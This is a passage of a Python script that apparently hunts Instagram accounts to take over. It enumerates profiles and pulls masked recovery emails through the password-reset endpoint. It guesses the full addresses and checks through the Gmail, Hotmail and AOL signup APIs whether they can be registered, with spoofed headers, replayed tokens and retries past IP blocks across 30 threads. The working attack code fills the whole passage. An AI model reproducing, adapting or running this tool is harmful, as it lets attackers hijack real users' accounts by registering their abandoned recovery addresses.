        'x-client-data': 'CLrdygE=',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
        'x-same-domain': '1',
    }

    data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'

    params = {
        'TL': tok,
    }

    re = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=None,
        headers=headers,
        data=data,
    ).text

    if 'signup' in re:
        #print("untaken")
        #get_info(username,"gmail.com")
        check(username,"gmail.com")
    else:
        print("\033[90m" + username + " : taken gmail mail" + "\033[0m")

def get_hotmail_tokens(email):
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }
            response = requests.get('https://signup.live.com/signup', headers=headers)
            canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
            amsc = response.cookies.get_dict()['amsc']
            cookies = {
                'amsc': amsc,
            }
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'canary': canary,
                'content-type': 'application/json; charset=utf-8',
                'origin': 'https://signup.live.com',
                'referer': 'https://signup.live.com/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }
            json_data = {
                'clientExperiments': [
                    {
                        'parallax': 'enableplaintextforsignupexperiment',
                        'control': 'enableplaintextforsignupexperiment_control',
                        'treatments': [
                            'enableplaintextforsignupexperiment_treatment',
                        ],
                    },
                ],
            }
            response = requests.post(
                'https://signup.live.com/API/EvaluateExperimentAssignments',
                cookies=cookies,
                headers=headers,
                json=json_data,
            ).json()
            canary = response['apiCanary']
            check_hotmail(amsc, canary, email)
            #return amsc, canary, email
        except requests.exceptions.ConnectionError as e:
            print("Network error occurred, retrying")
            time.sleep(10)
            get_hotmail_tokens(email)
        except Exception as e:
            print(f"An error occurred: retrying")
            time.sleep(10)
            get_hotmail_tokens(email)


def check_hotmail(amsc, canary, email):
        username = email.split('@')[0]
        try:
            cookies = {
    'amsc': amsc,
}
            headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'canary': canary,
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/',
    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
}
            json_data = {
    'signInName': email,
}
            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data).text
            if '"isAvailable":true' in response:
                #print("available")
                #domen = "hotmail.com"
                #get_info(username,"hotmail.com")
                check(username,"hotmail.com")
            else:
                print("\033[90m" + username + " : taken hotmail mail" + "\033[0m")
        except requests.exceptions.ConnectionError as e:
            check_hotmail(email)

def cokadada():
    try:
        cokANDdata = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        
        cookies = cokANDdata.cookies.get_dict()
        AS = cookies['AS']
        A1 = cookies['A1']
        A3 = cookies['A3']
        A1S = cookies['A1S']
        
        text = cokANDdata.text
        specData = text.split('''name="attrSetIndex">
        <input type="hidden" value="''')[1].split(f'" name="specData">')[0]
        specId = text.split('''name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" value="''')[1].split(f'" name="specId">')[0]
        crumb = text.split('''name="cacheStored">
        <input type="hidden" value="''')[1].split(f'" name="crumb">')[0]
        sessionIndex = text.split('''"acrumb">
        <input type="hidden" value="''')[1].split(f'" name="sessionIndex">')[0]
        acrumb = text.split('''name="crumb">
        <input type="hidden" value="''')[1].split(f'" name="acrumb">')[0]
        
        return AS, A1, A3, A1S, specData, specId, crumb, acrumb, sessionIndex
    
    except requests.exceptions.RequestException as e:
        print(f"Network error: retrying")
        time.sleep(10)
        return cokadada()

def checkaolav(email):
    if '@' in email:
        email = email.split('@')[0]
    
    tm1 = str(time.time()).split('.')[0]
    AS, A1, A3, A1S, specData, specId, crumb, acrumb, sessionIndex = cokadada()
    
    cookies = {
        'gpp': 'DBAA',
        'gpp_sid': '-1',
        'A1': A1,
        'A3': A3,
        'A1S': A1S,
        '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
        '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
        'cmp': f't={str(time.time()).split(".")[0]}&j=0&u=1---',
        'AS': AS,
    }
    
    headers = {
        'authority': 'login.aol.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://login.aol.com',
        'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        'validateField': 'userId',
    }
    
    data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&mm=&dd=&yyyy=&signup='
    
    try:
        response = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        
        if '{"errors":[{"name":"firstName","error":"FIELD_EMPTY"},{"name":"lastName","error":"FIELD_EMPTY"},{"name":"birthDate","error":"INVALID_BIRTHDATE"},{"name":"password","error":"FIELD_EMPTY"}]}' in response:
            print("available")
            domen = "aol.com"
            #get_info(email,"aol.com")
            check(username,"aol.com")
            #get_info(email)
        elif any(keyword in response for keyword in ['IDENTIFIER_NOT_AVAILABLE', 'LENGTH_TOO_SHORT', 'CANNOT_START_WITH_SPECIAL_CHARACTER_OR_NUMBER', 'CANNOT_END_WITH_SPECIAL_CHARACTER', 'SOME_SPECIAL_CHARACTERS_NOT_ALLOWED']):
            print("\033[90m" + email + " : Taken aol mail" + "\033[0m")
        else:
            time.sleep(10)
            checkaolav(email)
    
    except requests.exceptions.ConnectionError as e:
        print(f"Network error: retrying")
        time.sleep(10)
        checkaolav(email)

def check_email(username, email):
    if "@aol.com" in email:
        at_index = email.index('@')
        if username[0] == email[0] and username[-1] == email[at_index - 1]:
            print("\033[93m" + email + " : Matched aol" + "\033[0m")
            aolmail = username + "@aol.com"
            #print(aolmail)
            checkaolav(aolmail)
        else:
            print("\033[91m" + email + " : Not Matched aol" + "\033[0m")
    
    elif "@gmail.com" in email:
        at_index = email.index('@')
        if username[0] == email[0] and username[-1] == email[at_index - 1]:
            print("\033[93m" + email + " : Matched gmail" + "\033[0m")
            gmail = username + "@gmail.com"
            #print(gmail)
            checkgmail(username)
        else:
            print("\033[91m" + email + " : Not Matched gmail" + "\033[0m")
    
    elif "@hotmail.com" in email:
        at_index = email.index('@')
        if username[0] == email[0] and username[-1] == email[at_index - 1]:
            print("\033[93m" + email + " : Matched hotmail" + "\033[0m")
            hotmail = username + "@hotmail.com"
            #print(hotmail)
            get_hotmail_tokens(hotmail)
        else:
            print("\033[91m" + email + " : Not Matched hotmail" + "\033[0m")
    
    elif "@y*" in email and ".com" in email:
        if username[0] == email[0]:
            print("\033[93m" + email + " : Matched yopmail" + "\033[0m")
            domen = "aol.com"
            #get_info(username,"yopmail.com")
            check(username,"yopmail.com")
        else:
            print("\033[91m" + email + " : Not Matched yopmail" + "\033[0m")

    elif "@o" in email and ".com" in email:
        at_index = email.index('@')
        if username[0] == email[0] and username[-1] == email[at_index - 1]:
            print("\033[93m" + email + " : Matched outlook" + "\033[0m")
            outlook = username + "@outlook.com"
            check_outlook(username)
        else:
            print("\033[91m" + email + " : Not Matched outlook" + "\033[0m")
            
    elif "@yahoo.com" in email:
        at_index = email.index('@')
        if username[0] == email[0] and username[-1] == email[at_index - 1]:
            print("\033[93m" + email + " : Matched yahoo" + "\033[0m")
            yahoo = username + "@yahoo.com"
            check_yahoo(username)
        else:
            print("\033[91m" + email + " : Not Matched yahoo" + "\033[0m")
        
def reset(username):
    reset_headers = {
        'X-Pigeon-Session-Id': '329c12da-5d0e-49cb-8c1f-21eac45cd37e',
        'X-Pigeon-Rawclienttime': '1699874470.503',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (31/12; 320dpi; 720x1552; HONOR; RKY-LX2; HNRKY-M1; mt6765; ar_IQ; 161478664)',
        'Accept-Language': 'en-US',
        'Cookie': 'mid=ZVIGRQABAAEZYXrdQ825gbMAjn3Y; csrftoken=aHrk0ApciS6XmTgy08kYqyjj6mYBooRq',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '355',
    }

    reset_data = f'signed_body=eca881c66fea103cf5a6dc0880766519bea0c80de17d757a5771e96847067188.%7B%22_csrftoken%22%3A%22aHrk0ApciS6XmTgy08kYqyjj6mYBooRq%22%2C%22adid%22%3A%2249ff8e96-bd0c-4793-8a46-6f59a9eac6e4%22%2C%22guid%22%3A%2204dd27d7-9663-43a6-85ed-fd77269291e3%22%2C%22device_id%22%3A%22android-d4418f4e12f4c6d8%22%2C%22query%22%3A%22{username}%22%7D&ig_sig_key_version=4'

    try:
        response = requests.post(
            url='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
            headers=reset_headers,
            data=reset_data
        )

        sto = response.json()

        if "ok" in sto['status']:
            mail = sto['email']
            if "@" in mail:
                check_email(username, mail)
            else:
                print(f"\033[90m{mail} : other domain\033[0m")
        elif "invalid" in sto:
            print(f"\033[91m{username}@gmail.com : False Email\033[0m")
        elif "Sorry, we can't send you a login link. Please contact Instagram for more help." in sto:
            print(f"\033[91m{username}@gmail.com : Help occurred\033[0m")
        elif "user_not_found" in sto:
            print(f"\033[91mIP Blocked ===============\033[0m")
            reset(username)
        elif "wait" in response.text:
            print(f"\033[91mIP Blocked ===============\033[0m")
            time.sleep(10)
            reset(username)
        else:
            print(f"\033[91m{sto} : {username} : Skipped \033[0m")

    except requests.exceptions.ConnectionError:
        reset(username)

def user_gen():
    while True:
        try:
            lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
            id = str(random.randrange(900990000, 1629009999))#900990000-1629009999
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/0s9s/',
                'user-agent': str(generate_user_agent()),
                'x-fb-lsd': 'insta' + lsd,
            }
            data = {
                'lsd': 'insta' + lsd,
                'variables': '{"id":"' + id + '","relay_header":false,"render_surface":"PROFILE"}',
                'doc_id': '7397388303713986',
            }
            user = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            data = json.loads(user.text)
            user_info = data['data']['user']
            username = user_info['username']
            follower_count = user_info['follower_count']
            post_count = user_info['media_count']
            
            if '_' in username:
                continue
            else:
                if post_count > 6:
                    if follower_count > 80:
                        reset(username)
                    else:
                        print(f"\033[38;5;208m{username}@gmail.com : No meta - followers\033[0m")
                else:
                    print(f"\033[38;5;208m{username}@gmail.com : No meta - post\033[0m")
        except:
            user_gen()

current_date = datetime.now()
expiry_date = datetime(2024, 8, 25)

if current_date < expiry_date:
    threads = []
    for _ in range(30):
        thread = threading.Thread(target=user_gen)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
else:
    print("This code is no longer valid.")
